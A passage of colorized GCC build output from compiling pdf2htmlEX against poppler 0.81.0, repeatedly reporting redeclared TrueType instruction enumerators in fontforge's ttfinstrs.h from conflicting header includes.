  ttf_sdb=0x5e, [01;36m[Kttf_sdpvtl[m[K=0x86, ttf_sds=0x5f, ttf_sfvfs=0x0b, ttf_sfvtca=0x04,
                [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:33:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sds[m[K’
  ttf_sdb=0x5e, ttf_sdpvtl=0x86, [01;31m[Kttf_sds[m[K=0x5f, ttf_sfvfs=0x0b, ttf_sfvtca=0x04,
                                 [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:33:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sds[m[K’ was here
  ttf_sdb=0x5e, ttf_sdpvtl=0x86, [01;36m[Kttf_sds[m[K=0x5f, ttf_sfvfs=0x0b, ttf_sfvtca=0x04,
                                 [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:47:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sfvfs[m[K’
  ttf_sdb=0x5e, ttf_sdpvtl=0x86, ttf_sds=0x5f, [01;31m[Kttf_sfvfs[m[K=0x0b, ttf_sfvtca=0x04,
                                               [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:47:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sfvfs[m[K’ was here
  ttf_sdb=0x5e, ttf_sdpvtl=0x86, ttf_sds=0x5f, [01;36m[Kttf_sfvfs[m[K=0x0b, ttf_sfvtca=0x04,
                                               [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:63:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sfvtca[m[K’
  ttf_sdb=0x5e, ttf_sdpvtl=0x86, ttf_sds=0x5f, ttf_sfvfs=0x0b, [01;31m[Kttf_sfvtca[m[K=0x04,
                                                               [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:48:63:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sfvtca[m[K’ was here
  ttf_sdb=0x5e, ttf_sdpvtl=0x86, ttf_sds=0x5f, ttf_sfvfs=0x0b, [01;36m[Kttf_sfvtca[m[K=0x04,
                                                               [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sfvtl[m[K’
  [01;31m[Kttf_sfvtl[m[K=0x08, ttf_sfvtpv=0x0e, ttf_shc=0x34, ttf_shp=0x32, ttf_shpix=0x38,
  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sfvtl[m[K’ was here
  [01;36m[Kttf_sfvtl[m[K=0x08, ttf_sfvtpv=0x0e, ttf_shc=0x34, ttf_shp=0x32, ttf_shpix=0x38,
  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:18:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sfvtpv[m[K’
  ttf_sfvtl=0x08, [01;31m[Kttf_sfvtpv[m[K=0x0e, ttf_shc=0x34, ttf_shp=0x32, ttf_shpix=0x38,
                  [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:18:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sfvtpv[m[K’ was here
  ttf_sfvtl=0x08, [01;36m[Kttf_sfvtpv[m[K=0x0e, ttf_shc=0x34, ttf_shp=0x32, ttf_shpix=0x38,
                  [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:35:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_shc[m[K’
  ttf_sfvtl=0x08, ttf_sfvtpv=0x0e, [01;31m[Kttf_shc[m[K=0x34, ttf_shp=0x32, ttf_shpix=0x38,
                                   [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:35:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_shc[m[K’ was here
  ttf_sfvtl=0x08, ttf_sfvtpv=0x0e, [01;36m[Kttf_shc[m[K=0x34, ttf_shp=0x32, ttf_shpix=0x38,
                                   [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:49:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_shp[m[K’
  ttf_sfvtl=0x08, ttf_sfvtpv=0x0e, ttf_shc=0x34, [01;31m[Kttf_shp[m[K=0x32, ttf_shpix=0x38,
                                                 [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:49:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_shp[m[K’ was here
  ttf_sfvtl=0x08, ttf_sfvtpv=0x0e, ttf_shc=0x34, [01;36m[Kttf_shp[m[K=0x32, ttf_shpix=0x38,
                                                 [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:63:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_shpix[m[K’
  ttf_sfvtl=0x08, ttf_sfvtpv=0x0e, ttf_shc=0x34, ttf_shp=0x32, [01;31m[Kttf_shpix[m[K=0x38,
                                                               [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:49:63:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_shpix[m[K’ was here
  ttf_sfvtl=0x08, ttf_sfvtpv=0x0e, ttf_shc=0x34, ttf_shp=0x32, [01;36m[Kttf_shpix[m[K=0x38,
                                                               [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_shz[m[K’
  [01;31m[Kttf_shz[m[K=0x36, ttf_sloop=0x17, ttf_smd=0x1a, ttf_spvfs=0x0a, ttf_spvtca=0x02,
  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_shz[m[K’ was here
  [01;36m[Kttf_shz[m[K=0x36, ttf_sloop=0x17, ttf_smd=0x1a, ttf_spvfs=0x0a, ttf_spvtca=0x02,
  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sloop[m[K’
  ttf_shz=0x36, [01;31m[Kttf_sloop[m[K=0x17, ttf_smd=0x1a, ttf_spvfs=0x0a, ttf_spvtca=0x02,
                [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sloop[m[K’ was here
  ttf_shz=0x36, [01;36m[Kttf_sloop[m[K=0x17, ttf_smd=0x1a, ttf_spvfs=0x0a, ttf_spvtca=0x02,
                [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_smd[m[K’
  ttf_shz=0x36, ttf_sloop=0x17, [01;31m[Kttf_smd[m[K=0x1a, ttf_spvfs=0x0a, ttf_spvtca=0x02,
                                [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_smd[m[K’ was here
  ttf_shz=0x36, ttf_sloop=0x17, [01;36m[Kttf_smd[m[K=0x1a, ttf_spvfs=0x0a, ttf_spvtca=0x02,
                                [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:46:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_spvfs[m[K’
  ttf_shz=0x36, ttf_sloop=0x17, ttf_smd=0x1a, [01;31m[Kttf_spvfs[m[K=0x0a, ttf_spvtca=0x02,
                                              [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:46:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_spvfs[m[K’ was here
  ttf_shz=0x36, ttf_sloop=0x17, ttf_smd=0x1a, [01;36m[Kttf_spvfs[m[K=0x0a, ttf_spvtca=0x02,
                                              [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:62:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_spvtca[m[K’
  ttf_shz=0x36, ttf_sloop=0x17, ttf_smd=0x1a, ttf_spvfs=0x0a, [01;31m[Kttf_spvtca[m[K=0x02,
                                                              [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:50:62:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_spvtca[m[K’ was here
  ttf_shz=0x36, ttf_sloop=0x17, ttf_smd=0x1a, ttf_spvfs=0x0a, [01;36m[Kttf_spvtca[m[K=0x02,
                                                              [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_spvtl[m[K’
  [01;31m[Kttf_spvtl[m[K=0x06, ttf_sround=0x76, ttf_srp0=0x10, ttf_srp1=0x11, ttf_srp2=0x12,
  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_spvtl[m[K’ was here
  [01;36m[Kttf_spvtl[m[K=0x06, ttf_sround=0x76, ttf_srp0=0x10, ttf_srp1=0x11, ttf_srp2=0x12,
  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:18:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sround[m[K’
  ttf_spvtl=0x06, [01;31m[Kttf_sround[m[K=0x76, ttf_srp0=0x10, ttf_srp1=0x11, ttf_srp2=0x12,
                  [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:18:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sround[m[K’ was here
  ttf_spvtl=0x06, [01;36m[Kttf_sround[m[K=0x76, ttf_srp0=0x10, ttf_srp1=0x11, ttf_srp2=0x12,
                  [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:35:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_srp0[m[K’
  ttf_spvtl=0x06, ttf_sround=0x76, [01;31m[Kttf_srp0[m[K=0x10, ttf_srp1=0x11, ttf_srp2=0x12,
                                   [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:35:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_srp0[m[K’ was here
  ttf_spvtl=0x06, ttf_sround=0x76, [01;36m[Kttf_srp0[m[K=0x10, ttf_srp1=0x11, ttf_srp2=0x12,
                                   [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:50:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_srp1[m[K’
  ttf_spvtl=0x06, ttf_sround=0x76, ttf_srp0=0x10, [01;31m[Kttf_srp1[m[K=0x11, ttf_srp2=0x12,
                                                  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:50:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_srp1[m[K’ was here
  ttf_spvtl=0x06, ttf_sround=0x76, ttf_srp0=0x10, [01;36m[Kttf_srp1[m[K=0x11, ttf_srp2=0x12,
                                                  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:65:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_srp2[m[K’
  ttf_spvtl=0x06, ttf_sround=0x76, ttf_srp0=0x10, ttf_srp1=0x11, [01;31m[Kttf_srp2[m[K=0x12,
                                                                 [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:51:65:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_srp2[m[K’ was here
  ttf_spvtl=0x06, ttf_sround=0x76, ttf_srp0=0x10, ttf_srp1=0x11, [01;36m[Kttf_srp2[m[K=0x12,
                                                                 [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_ssw[m[K’
  [01;31m[Kttf_ssw[m[K=0x1f, ttf_sswci=0x1e, ttf_sub=0x61, ttf_svtca=0x00, ttf_swap=0x23,
  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_ssw[m[K’ was here
  [01;36m[Kttf_ssw[m[K=0x1f, ttf_sswci=0x1e, ttf_sub=0x61, ttf_svtca=0x00, ttf_swap=0x23,
  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sswci[m[K’
  ttf_ssw=0x1f, [01;31m[Kttf_sswci[m[K=0x1e, ttf_sub=0x61, ttf_svtca=0x00, ttf_swap=0x23,
                [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sswci[m[K’ was here
  ttf_ssw=0x1f, [01;36m[Kttf_sswci[m[K=0x1e, ttf_sub=0x61, ttf_svtca=0x00, ttf_swap=0x23,
                [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_sub[m[K’
  ttf_ssw=0x1f, ttf_sswci=0x1e, [01;31m[Kttf_sub[m[K=0x61, ttf_svtca=0x00, ttf_swap=0x23,
                                [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_sub[m[K’ was here
  ttf_ssw=0x1f, ttf_sswci=0x1e, [01;36m[Kttf_sub[m[K=0x61, ttf_svtca=0x00, ttf_swap=0x23,
                                [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
